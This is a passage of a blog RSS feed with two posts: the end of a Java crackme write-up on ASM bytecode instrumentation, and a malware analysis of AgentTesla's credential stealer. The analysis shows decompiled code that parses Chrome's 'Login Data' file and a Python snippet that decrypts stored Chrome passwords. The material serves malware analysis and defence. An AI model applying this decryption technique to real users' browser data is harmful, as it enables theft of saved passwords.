</p><p>I was able to install it but alas I don’t know why it wasn’t able to identify the main method.<br><a href="/img/noverify/bytecode_visualizer_err.png" class="gallery-item"><img src="/img/noverify/bytecode_visualizer_err.png"></a>  </p><p>At last, I reached out for some java bytecode editors to add debug print statements.  </p><ul><li><a href="https://github.com/Col-E/Recaf">Recaf - A modern bytecode editor</a>  </li><li><a href="https://github.com/GraxCode/JByteMod-Beta">JByteMod - Java bytecode editor</a>  </li></ul><p>Recaf is very easy to use and got a nice UI as well so I went with it.  </p><p>Also I asked Col-E(Recaf’s Developer) about any good bytecode debuggers and unfortunately, it turns out there aren’t any as of now!<br>I also shared the weirdness of this jar in extracting the class.  </p><p><a href="/img/noverify/jar_extract.PNG"><a href="/img/noverify/jar_extract.PNG" title="jar_extract" class="gallery-item"><img src="/img/noverify/jar_extract.PNG" alt="jar_extract"></a></a>  </p><p>And, Then I got to know about the forward slash trick which was pretty obvious from the jar verbose extraction that I didn’t observe carefully before.  </p><p><a href="/img/noverify/fwd_slash.PNG"><a href="/img/noverify/fwd_slash.PNG" title="fwd_slash" class="gallery-item"><img src="/img/noverify/fwd_slash.PNG" alt="fwd_slash"></a></a>  </p><p>Obviously the decompiler view doesn’t work so we’d have to switch to the class table mode.  </p><p><a href="/img/noverify/class_mode.PNG"><a href="/img/noverify/class_mode.PNG" title="class_mode" class="gallery-item"><img src="/img/noverify/class_mode.PNG" alt="class_mode"></a></a>  </p><p>Select method_0 and edit with assembler.  </p><p><a href="/img/noverify/edit_assembler.PNG"><a href="/img/noverify/edit_assembler.PNG" title="edit_assembler" class="gallery-item"><img src="/img/noverify/edit_assembler.PNG" alt="edit_assembler"></a></a>  </p><p>We can just add a <code>System.out.println()</code> for variable null1 shown.  </p><p><a href="/img/noverify/edit_0.PNG"><a href="/img/noverify/edit_0.PNG" title="edit_0" class="gallery-item"><img src="/img/noverify/edit_0.PNG" alt="edit_0"></a></a>  </p><p>If everything goes well, we should see this output.  </p><p><a href="/img/noverify/edited_0_output.PNG"><a href="/img/noverify/edited_0_output.PNG" title="edited_0_output" class="gallery-item"><img src="/img/noverify/edited_0_output.PNG" alt="edited_0_output"></a></a>  </p><p>We can do the same for the fun variable.<br>But we need some automation for adding these instructions in every method.<br>And currently Recaf doesn’t have any <a href="https://github.com/Col-E/Recaf/issues/151">Automation API</a>.<br>So to resolve this problem I turned to dynamic instrumentation.  </p><h2 id="Dynamic-Instrumentation-using-ASM"><a href="#Dynamic-Instrumentation-using-ASM" class="headerlink" title="Dynamic Instrumentation using ASM"></a>Dynamic Instrumentation using ASM</h2><p>Just FYI I’m new to the instrumentation part so I checked out some frameworks/libraries which could help me with it.<br>As it turns out there are several options and I tried some of them such as <a href="http://www.javassist.org/">JavaAssist</a>, <a href="https://bytebuddy.net/">ByteBuddy</a> and <a href="https://asm.ow2.io/">ASM</a>.<br>But ASM is at the lowest level and is the base for Bytebuddy and <a href="https://github.com/cglib/cglib">cglib</a> as well, so I went with it!  </p><p>Checkout this stackoverflow answer for more on <a href="https://stackoverflow.com/a/45891652">Analysis of bytecode libraries</a></p><p><strong>ASM User Guide and Tutorials</strong></p><ul><li><a href="https://asm.ow2.io/asm4-guide.pdf">https://asm.ow2.io/asm4-guide.pdf</a>  </li><li><a href="http://www.egtry.com/java/bytecode/asm/">http://www.egtry.com/java/bytecode/asm/</a>  </li><li><a href="https://www.tomsquest.com/blog/2014/01/intro-java-agent-and-bytecode-manipulation/">https://www.tomsquest.com/blog/2014/01/intro-java-agent-and-bytecode-manipulation/</a>  </li><li><a href="https://stackoverflow.com/questions/tagged/java-bytecode-asm">https://stackoverflow.com/questions/tagged/java-bytecode-asm</a></li></ul><p>For verifying your ASM Implementation and how ASM reads your class you can checkout <a href="https://github.com/iridescent995/ASM_bytecode_manipulation/tree/master/ASMifier">ASMifier</a>.  </p><p>Here we have <code>v5</code> as <code>var_1</code> and the following condition adds these three lines of code after it encounters any <code>(ISTORE, 1)</code> instruction.  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (opcode == ISTORE &amp;&amp; <span class="keyword">var</span> == <span class="number">1</span>) &#123;</span><br><span class="line">    mv.visitFieldInsn(GETSTATIC, <span class="string">&quot;java/lang/System&quot;</span>, <span class="string">&quot;out&quot;</span>, <span class="string">&quot;Ljava/io/PrintStream;&quot;</span>);</span><br><span class="line">    mv.visitVarInsn(ILOAD, <span class="number">1</span>);</span><br><span class="line">    mv.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/io/PrintStream&quot;</span>, <span class="string">&quot;println&quot;</span>, <span class="string">&quot;(I)V&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Same goes for logging the static variable ie. <code>fun</code>.  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(opcode == PUTSTATIC &amp;&amp; name.equals(<span class="string">&quot;fun&quot;</span>)) &#123;</span><br><span class="line">    mv.visitFieldInsn(GETSTATIC, <span class="string">&quot;java/lang/System&quot;</span>, <span class="string">&quot;out&quot;</span>, <span class="string">&quot;Ljava/io/PrintStream;&quot;</span>);</span><br><span class="line">    mv.visitFieldInsn(GETSTATIC, <span class="string">&quot;me/nov/crackme/CrackMe&quot;</span>, <span class="string">&quot;fun&quot;</span>, <span class="string">&quot;C&quot;</span>);</span><br><span class="line">    mv.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/io/PrintStream&quot;</span>, <span class="string">&quot;println&quot;</span>, <span class="string">&quot;(I)V&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I added a string ie. <code>CrackMe.fun =</code> to differentiate both of them. </p><p><a href="/img/noverify/agent_1.PNG"><a href="/img/noverify/agent_1.PNG" title="agent_1" class="gallery-item"><img src="/img/noverify/agent_1.PNG" alt="agent_1"></a></a>  </p><p>Cool lets see how it ends.   </p><p><a href="/img/noverify/agent_2.PNG"><a href="/img/noverify/agent_2.PNG" title="agent_2" class="gallery-item"><img src="/img/noverify/agent_2.PNG" alt="agent_2"></a></a>  </p><p><strong>Weirdness of method_63</strong></p><p>Ahh as you can see, I missed the most important part of this crackme, ie. UTF-8 LOL !<br>So single surrogates are illegal and are converted to <strong>‘ ? ‘</strong> character (ie. 63).<br>FYI Surrogates are characters in the Unicode range U+D800 - U+DFFF.<br>And Here we notice 56575 which is then converted to 63.  </p><p>Here it inverts the comparision sign and validates if the length of stacktrace is less than 127.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Thread.currentThread().getStackTrace().length &lt; <span class="number">0x7F</span>)</span><br></pre></td></tr></table></figure><p>So the stacktrace length check for other methods is bogus and is only used for deception.  </p><p>Also the v5 in method_63 always results in 127 which returns true halting the program.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(( get_hashcode(callee_fcn) * arg) * <span class="number">0x7FFF</span> &lt;&lt; <span class="number">3</span> | <span class="number">127</span>) &amp; <span class="number">127</span></span><br></pre></td></tr></table></figure><p>So now we know what were we missing.  </p><hr><h1 id="Solution-and-Source-files"><a href="#Solution-and-Source-files" class="headerlink" title="Solution and Source files"></a>Solution and Source files</h1><blockquote><p>I’ve uploaded all of my solution files along with the ASM Agent project for this crackme on my github.<br><a href="https://github.com/mrT4ntr4/Challenge-Solution-Files/tree/master/noverify_crackme_3">mrT4ntr4/Challenge-Solution-Files/noverify_crackme_3</a></p></blockquote><p>Also krakatau does a good job that I got to know about from the author.<br>Also some of the source files were disclosed by him:  </p><ul><li><a href="https://hastebin.com/bacuwijuwe">Original Driver Source code</a></li><li><a href="https://hastebin.com/cexomojesu">Keygen for methods</a></li><li><a href="https://hastebin.com/rujanapeso">Final Keygen</a></li><li><a href="https://hastebin.com/retilapila">Original ASMifier source code for final crackme</a></li></ul><p>And, some manual obfuscation was done afterwards.  </p><p>I enjoyed this challenge, all thanks to <a href="https://twitter.com/graxcoding">@graxcoding</a> for making it!  </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/crackmes-one/">crackmes.one</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/writeup/">writeup</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/crackme/">crackme</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/java/">java</category>
      
      
      <comments>https://mrt4ntr4.github.io/Noverify-Java-Crackme-3/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>How Analysing an AgentTesla Could Lead To Attackers Inbox - Part II</title>
      <link>https://mrt4ntr4.github.io/How-Analysing-an-AgentTesla-Could-Lead-To-Attackers-Inbox-2/</link>
      <guid>https://mrt4ntr4.github.io/How-Analysing-an-AgentTesla-Could-Lead-To-Attackers-Inbox-2/</guid>
      <pubDate>Wed, 15 Apr 2020 01:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/MA/sample1/thumb2.png" title="banner" class="gallery-item"><img src="/img/MA/sample1/thumb2.png" alt="banner"></a></p><p>I hope you’ve read the <a href="/How-Analysing-an-AgentTesla-Gives-Access-To-Attackers-Inbox-1/">Part I</a> of this series.<br>There we discussed some techniques to do basic analysis, tested the sample on any.run and most importantly the “Decrypting Strings” part where we learned how it uses AES encrypted strings to evade some simple detections.   </p><p>So Lets get started !!  </p><h1 id="Some-Tidbits"><a href="#Some-Tidbits" class="headerlink" title="Some Tidbits"></a>Some Tidbits</h1><p>To continue with where we left earlier, the next fcn called is <em>tlg()</em> and it copies the malware into the default temporary location as <strong>TMP#{Millisecond}.bin</strong>  </p><p><a href="/img/MA/sample1/e27.PNG"><a href="/img/MA/sample1/e27.PNG" title="e27" class="gallery-item"><img src="/img/MA/sample1/e27.PNG" alt="e27"></a></a>  </p><p>Later it starts to execute the fcn <em>tkq.tjg</em> in a thread.  </p><p><a href="/img/MA/sample1/e28.PNG"><a href="/img/MA/sample1/e28.PNG" title="e28" class="gallery-item"><img src="/img/MA/sample1/e28.PNG" alt="e28"></a></a>  </p><p>It uses <em>tkq.tjg</em> to perform some registry key modifications usually for persistence and execute some system commands.<br>It uses that temporary file it just created as well.  </p><p><a href="/img/MA/sample1/e29.PNG"><a href="/img/MA/sample1/e29.PNG" title="e29" class="gallery-item"><img src="/img/MA/sample1/e29.PNG" alt="e29"></a></a>  </p><p><a href="/img/MA/sample1/e30.PNG"><a href="/img/MA/sample1/e30.PNG" title="e30" class="gallery-item"><img src="/img/MA/sample1/e30.PNG" alt="e30"></a></a>  </p><hr><h1 id="Stealing-Credentials"><a href="#Stealing-Credentials" class="headerlink" title="Stealing Credentials"></a>Stealing Credentials</h1><a href="https://media.giphy.com/media/cjT17PDuM7azm/giphy.gif" title="drawing" class="gallery-item"><img src="https://media.giphy.com/media/cjT17PDuM7azm/giphy.gif" alt="drawing" width="300"/></a>   <p>PS This is the core part of the series and its important to understand.  </p><p>So, The next function to notice is <em>kqe</em> which returns a list.<br>The first statement gets the path to the AppData/Local.  </p><p><a href="/img/MA/sample1/e31.PNG"><a href="/img/MA/sample1/e31.PNG" title="e31" class="gallery-item"><img src="/img/MA/sample1/e31.PNG" alt="e31"></a></a>  </p><p>Then the execution is passed to <em>zla.zgh</em> with the location of Chrome concatenated with the AppData location.  </p><p><a href="/img/MA/sample1/e32.PNG"><a href="/img/MA/sample1/e32.PNG" title="e32" class="gallery-item"><img src="/img/MA/sample1/e32.PNG" alt="e32"></a></a>  </p><p>It also concatenates <em>\Default\Login Data</em> and <em>\Login Data</em> and saves those 2 results in a list.<br>Next it looks whether the Directory <strong>User Data</strong> exists in the particular location.  </p><p><a href="/img/MA/sample1/e33.PNG"><a href="/img/MA/sample1/e33.PNG" title="e33" class="gallery-item"><img src="/img/MA/sample1/e33.PNG" alt="e33"></a></a>  </p><p><a href="/img/MA/sample1/e34.PNG"><a href="/img/MA/sample1/e34.PNG" title="e34" class="gallery-item"><img src="/img/MA/sample1/e34.PNG" alt="e34"></a></a>  </p><p>If the directory is present, it iterates over it to find its subdirectories.  </p><p><a href="/img/MA/sample1/e35.PNG"><a href="/img/MA/sample1/e35.PNG" title="e35" class="gallery-item"><img src="/img/MA/sample1/e35.PNG" alt="e35"></a></a>  </p><p>And at last compares if the string <strong>Profile</strong> is present in any of the items in the directories list.<br>Basically It checks if any subdirectory named Profile exists. This could be the case when I would have installed other browsers such as Firefox, etc. </p><p>PS I only have only installed Chrome on my Victim VM and We’ll be only exploring the process of credential stealer in case of Chrome.  </p><p><a href="/img/MA/sample1/e36.PNG"><a href="/img/MA/sample1/e36.PNG" title="e36" class="gallery-item"><img src="/img/MA/sample1/e36.PNG" alt="e36"></a></a>  </p><p><a href="/img/MA/sample1/e37.PNG"><a href="/img/MA/sample1/e37.PNG" title="e37" class="gallery-item"><img src="/img/MA/sample1/e37.PNG" alt="e37"></a></a>  </p><p>Finally It checks for the real <strong>Login Data</strong> file in both locations <strong>User Data\Default\</strong>, <strong>\User Data\</strong> (from items of prev list) and if it exists it executes fcn. <strong>emx</strong>. </p><p><a href="/img/MA/sample1/e38.PNG"><a href="/img/MA/sample1/e38.PNG" title="e38" class="gallery-item"><img src="/img/MA/sample1/e38.PNG" alt="e38"></a></a>  </p><p>Now vcx contains the content of the <em>Login Data</em> file.  </p><p><a href="/img/MA/sample1/e59.PNG"><a href="/img/MA/sample1/e59.PNG" title="e59" class="gallery-item"><img src="/img/MA/sample1/e59.PNG" alt="e59"></a></a>   </p><p>The <em>emx</em> function is interesting.<br>TBH I didn’t had any installation of Chrome on my VM but this function looks like it does a strict checking on the contents of the <em>Login Data</em> file and I needed to get a legitimate one.  </p><p>So First it wants the 52th byte in the file to be 0.<br>Then it compares var <em>vjl</em> to 0.<br>For <em>vjl</em> we need to analyse <em>eco</em> fcn and I found out it just returns ‘arg2’ no. of bytes starting from ‘arg1’ index from <em>vcx</em>.  </p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">emx</span>(<span class="params"><span class="built_in">string</span> baseName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.vja = <span class="keyword">new</span> <span class="built_in">byte</span>[]&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (File.Exists(baseName))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.vcx = <span class="keyword">this</span>.vcl(baseName); <span class="comment">// vcx = file contents</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.vcx[<span class="number">52</span>] != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.vjo = checked((<span class="built_in">ushort</span>)<span class="keyword">this</span>.eco(<span class="number">16</span>, <span class="number">2</span>));  <span class="comment">// 2 chars from vcx[16]</span></span><br><span class="line">        <span class="keyword">this</span>.vjl = <span class="keyword">this</span>.eco(<span class="number">56</span>, <span class="number">4</span>);   <span class="comment">// 4 chars from vcx[56]</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">decimal</span>.Compare(<span class="keyword">new</span> <span class="built_in">decimal</span>(<span class="keyword">this</span>.vjl), <span class="number">0</span>m) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.vjl = <span class="number">1U</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.ejo(<span class="number">100U</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If it succeeds and passes all of the checks, control is passed over to fcn <strong>ejo</strong>.<br>The <em>ejo</em> fcn is cool as I thought that it would execute sql queries over the <em>Login Data</em> file to get the credentials but there is no need of doing this, we’ll see how :)<br>First It creates an obj list with 5 elements and has main elements as <em>item_name</em>, <em>item_type</em>,<em>sql_statement</em>. These all fields are filled by taking strings from different indexes from the original <em>Login Data</em> file.  </p><p><a href="/img/MA/sample1/e39.PNG"><a href="/img/MA/sample1/e39.PNG" title="e39" class="gallery-item"><img src="/img/MA/sample1/e39.PNG" alt="e39"></a></a>  </p><p><a href="/img/MA/sample1/e40.PNG"><a href="/img/MA/sample1/e40.PNG" title="e40" class="gallery-item"><img src="/img/MA/sample1/e40.PNG" alt="e40"></a></a>  </p><p><a href="/img/MA/sample1/e41.PNG"><a href="/img/MA/sample1/e41.PNG" title="e41" class="gallery-item"><img src="/img/MA/sample1/e41.PNG" alt="e41"></a></a>  </p><p>Also I don’t know why but <strong>ejo</strong> first adds data to the beginning 6 elements of <em>vjb</em> and then another loop adds 11 elements to it and fills them.  </p><blockquote><p>View whole content of vjb <a href="/files/MA/sample1/vjb.txt">here</a>. </p></blockquote><p><a href="/img/MA/sample1/e42.PNG"><a href="/img/MA/sample1/e42.PNG" title="e42" class="gallery-item"><img src="/img/MA/sample1/e42.PNG" alt="e42"></a></a>  </p><p>Next It searches for vjb[2] element and extracts all the words within parantheses and splits them with ‘,’ as a delimiter from the sql_statement.  </p><p><a href="/img/MA/sample1/e44.PNG"><a href="/img/MA/sample1/e44.PNG" title="e44" class="gallery-item"><img src="/img/MA/sample1/e44.PNG" alt="e44"></a></a>  </p><p>The resulting list looks like the following…<br>Also it strips the spaces which we can notice at the beginning now.<br><a href="/img/MA/sample1/e45.PNG"><a href="/img/MA/sample1/e45.PNG" title="e45" class="gallery-item"><img src="/img/MA/sample1/e45.PNG" alt="e45"></a></a>  </p><p>Now the resulting list is copied into the <em>vjh</em> array.  </p><p><a href="/img/MA/sample1/e46.PNG"><a href="/img/MA/sample1/e46.PNG" title="e46" class="gallery-item"><img src="/img/MA/sample1/e46.PNG" alt="e46"></a></a>  </p><p>Afterwards it iterates over its elements, splits them with “ “ as a delimiter and then only keeps the first element.  </p><p><a href="/img/MA/sample1/e48.PNG"><a href="/img/MA/sample1/e48.PNG" title="e48" class="gallery-item"><img src="/img/MA/sample1/e48.PNG" alt="e48"></a></a>  </p><p>The resulting array looks like the following..   </p><p><a href="/img/MA/sample1/e47.PNG"><a href="/img/MA/sample1/e47.PNG" title="e47" class="gallery-item"><img src="/img/MA/sample1/e47.PNG" alt="e47"></a></a>  </p><p>Now it initialises another array as <em>vjg</em> and has the structure from emx.emg.  </p><p><a href="/img/MA/sample1/e52.PNG"><a href="/img/MA/sample1/e52.PNG" title="e52" class="gallery-item"><img src="/img/MA/sample1/e52.PNG" alt="e52"></a></a>  </p><p>As you can see below it has a single element with two fields as <em>content</em> &amp; <em>row_id</em>. From this point I can guess that the content field is what we are looking for.   </p><p><a href="/img/MA/sample1/e53.PNG"><a href="/img/MA/sample1/e53.PNG" title="e53" class="gallery-item"><img src="/img/MA/sample1/e53.PNG" alt="e53"></a></a>  </p><p>Also another variable <em>array</em> is initialised with the structure of emx.ema.<br>Its elements have a <em>size</em> &amp; <em>type</em> field.  </p><p><a href="/img/MA/sample1/e54.PNG"><a href="/img/MA/sample1/e54.PNG" title="e54" class="gallery-item"><img src="/img/MA/sample1/e54.PNG" alt="e54"></a></a>  </p><p>And it fills both of them with some calculations done on obj2 and obj4.  </p><p><a href="/img/MA/sample1/gg1.PNG"><a href="/img/MA/sample1/gg1.PNG" title="gg1" class="gallery-item"><img src="/img/MA/sample1/gg1.PNG" alt="gg1"></a></a><br><a href="/img/MA/sample1/gg2.PNG"><a href="/img/MA/sample1/gg2.PNG" title="gg2" class="gallery-item"><img src="/img/MA/sample1/gg2.PNG" alt="gg2"></a></a>  </p><p>And it iterates till an element with type &gt; 9 exists in the array. </p><p><a href="/img/MA/sample1/gg3.PNG"><a href="/img/MA/sample1/gg3.PNG" title="gg3" class="gallery-item"><img src="/img/MA/sample1/gg3.PNG" alt="gg3"></a></a>  </p><p>Some of the elements are as follows..<br>We’ll see how is it used now.    </p><p><a href="/img/MA/sample1/e55.PNG"><a href="/img/MA/sample1/e55.PNG" title="e55" class="gallery-item"><img src="/img/MA/sample1/e55.PNG" alt="e55"></a></a>  </p><p>After this, it initialises the content field of vjg and we can see that it’ll have the same number of elements as of array. Hmm.. Looks like some operation will be done on array.  </p><p><a href="/img/MA/sample1/e56.PNG"><a href="/img/MA/sample1/e56.PNG" title="e56" class="gallery-item"><img src="/img/MA/sample1/e56.PNG" alt="e56"></a></a>  </p><p>And Woah.. after some loops we can observe that it was successful in extracting some strings from the sqlite <em>Login Data</em> file.  </p><p><a href="/img/MA/sample1/e57.PNG"><a href="/img/MA/sample1/e57.PNG" title="e57" class="gallery-item"><img src="/img/MA/sample1/e57.PNG" alt="e57"></a></a>  </p><p>Now lets dig into what happened with the array and what it did behind the scenes.  </p><p>So the statement in the above screenshot looks like the following.  </p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.vjg[num8 + num5].content[num13] = Encoding.Default.GetString(</span><br><span class="line">                    <span class="keyword">this</span>.vcx,</span><br><span class="line">                    Convert.ToInt32(</span><br><span class="line">                            <span class="built_in">decimal</span>.Add(</span><br><span class="line">                                <span class="built_in">decimal</span>.Add(</span><br><span class="line">                                    <span class="keyword">new</span> <span class="built_in">decimal</span>(num6), <span class="keyword">new</span> <span class="built_in">decimal</span>(num14)),</span><br><span class="line">                                <span class="keyword">new</span> <span class="built_in">decimal</span>(num15))),</span><br><span class="line">                    (<span class="built_in">int</span>)array[num13].size);</span><br></pre></td></tr></table></figure><p>Now at this point we can utilise the Locals window to check the values of some variables including num8, num5, num13, num6, num14, num15.  </p><p>I made some notes and added a watch over those variables.<br>As anybody can tell that num13 is the index of the content field but I noticed that num8, num5, num6, num14 remained the same for every value of num13.<br>So its basically accessing data from a particular index which is (num6 + num14 + num15) out of which (num6 + num14) is a constant, for me ie.  6797 so the only index to note is num15.<br>Also if you’d observe that array[x].size is what we previously initialised for every item in the array and its basically the string length record.  </p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vjg[<span class="number">0</span>].content[<span class="number">0x2</span>] = (<span class="keyword">this</span>.vcx, <span class="number">6797</span> + num15, <span class="number">0x8</span>)  <span class="comment">//&quot;username&quot; str</span></span><br><span class="line">then num15 = <span class="number">0x3e</span></span><br><span class="line">vjg[<span class="number">0</span>].content[<span class="number">0x3</span>] = (<span class="keyword">this</span>.vcx, <span class="number">6797</span> + num15, <span class="number">0xf</span>)  <span class="comment">//username</span></span><br><span class="line">then num15 = <span class="number">0x46</span></span><br><span class="line">vjg[<span class="number">0</span>].content[<span class="number">0x4</span>] = (<span class="keyword">this</span>.vcx, <span class="number">6797</span> + num15, <span class="number">0x8</span>)  <span class="comment">//&quot;password&quot; str</span></span><br><span class="line">num15 = <span class="number">0x4e</span></span><br><span class="line">vjg[<span class="number">0</span>].content[<span class="number">0x5</span>] = (<span class="keyword">this</span>.vcx, <span class="number">6797</span> + num15, <span class="number">0x30</span>) <span class="comment">//password</span></span><br><span class="line">num15 = <span class="number">0x74</span></span><br><span class="line">vjg[<span class="number">0</span>].content[<span class="number">0x6</span>] = (<span class="keyword">this</span>.vcx, <span class="number">6797</span> + num15, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>After the function ends we get to see every item in the locals.  </p><p><a href="/img/MA/sample1/e58.PNG"><a href="/img/MA/sample1/e58.PNG" title="e58" class="gallery-item"><img src="/img/MA/sample1/e58.PNG" alt="e58"></a></a> </p><p>Ahmm.. we get it on some functions as listed below. Now you know what to do.. Set a Breakpoint on them where they use it this deadly API Call :)<br>Now everybody knows there is only one way to decrypt that password from <em>Login Data</em> ie <a href="https://docs.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata">CryptUnprotectData</a> fcn Call. So I searched for any references to where its used..  </p><p><a href="/img/MA/sample1/e60.PNG"><a href="/img/MA/sample1/e60.PNG" title="e60" class="gallery-item"><img src="/img/MA/sample1/e60.PNG" alt="e60"></a></a>  </p><p>And BoomYa we hit one of them and we can also see our encrypted password in the locals window. Now we can copy the result from this call from this local by simply stepping into it.  </p><p><a href="/img/MA/sample1/e61.PNG"><a href="/img/MA/sample1/e61.PNG" title="e61" class="gallery-item"><img src="/img/MA/sample1/e61.PNG" alt="e61"></a></a><br>But wait thats not it.. Sh*t It has a whole function to decrypt it too to which it has passed the result of unprotected data and our original encrypted password.<br>This was something new for me coz I’m not use to C# and the decryption function in C looks very <a href="/files/MA/sample1/crackPass.c">different</a>.  </p><p>What I can observe from this is that it uses AES_GCM mode but don’t know the use of BCRYPT here. (Maybe It is the only one to include AES GCM Mode) <strong>¯\_(ツ)_/¯</strong>   </p><p><a href="/img/MA/sample1/e62.PNG"><a href="/img/MA/sample1/e62.PNG" title="e62" class="gallery-item"><img src="/img/MA/sample1/e62.PNG" alt="e62"></a></a>  </p><p>And Then fortunately I found some <a href="https://stackoverflow.com/questions/60640302/system-security-cryptography-cryptographicexception-the-parameter-is-incorrect">reference</a> which made my task easy.<br>I was finally successful to implement this in <a href="https://pycryptodome.readthedocs.io/en/latest/src/cipher/modern.html#gcm-mode">python</a>. </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">pwd, unproc_key</span>):</span></span><br><span class="line">    auth_tag = pwd[-<span class="number">16</span>:]</span><br><span class="line">    pwd = pwd.replace(auth_tag,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    nonce, proc_pwd = pwd[<span class="number">3</span>:<span class="number">15</span>], pwd[<span class="number">15</span>:]</span><br><span class="line">    cipher = AES.new(unproc_key, AES.MODE_GCM, nonce=nonce)</span><br><span class="line">    <span class="built_in">print</span> cipher.decrypt_and_verify(proc_pwd,auth_tag)</span><br><span class="line"></span><br><span class="line">pwd = <span class="string">&quot;763130492BD2706140CDA41C2701F3B4C2B5153DE018BA5512897731F1A1BB7D7982AA2BF3DEA4B299145D88B040ED58&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">unproc_key = <span class="string">&quot;2295D977B8F09202A4F8F7ACAF15C1B9EC411B126A0335208BE3DB8F14CA1551&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dec(pwd, unproc_key)</span><br></pre></td></tr></table></figure><p>Moving on, It creates another list <em>zah</em> where its elements have 3 fields named Item1, Item2 and Item3.<br>Here,<br>Item1 = Browser Name<br>Item2 = Browser Data Location<br>item3 = bool if it exists (maybe)  </p><p><a href="/img/MA/sample1/e63.PNG"><a href="/img/MA/sample1/e63.PNG" title="e63" class="gallery-item"><img src="/img/MA/sample1/e63.PNG" alt="e63"></a></a>  </p><p>Next It checks if whether it exists or not similarly it checked the chrome location.  </p><p><a href="/img/MA/sample1/e64.PNG"><a href="/img/MA/sample1/e64.PNG" title="e64" class="gallery-item"><img src="/img/MA/sample1/e64.PNG" alt="e64"></a></a>  </p><p>But now It doesn’t do anything (I don’t have Opera installed), instead I see the credentials from Chrome being added to a list. Now we have the decrypted password in it :)  </p><p><a href="/img/MA/sample1/e65.PNG"><a href="/img/MA/sample1/e65.PNG" title="e65" class="gallery-item"><img src="/img/MA/sample1/e65.PNG" alt="e65"></a></a>  </p><p>Later it continues to check for different browsers and some FTP Clients as well.  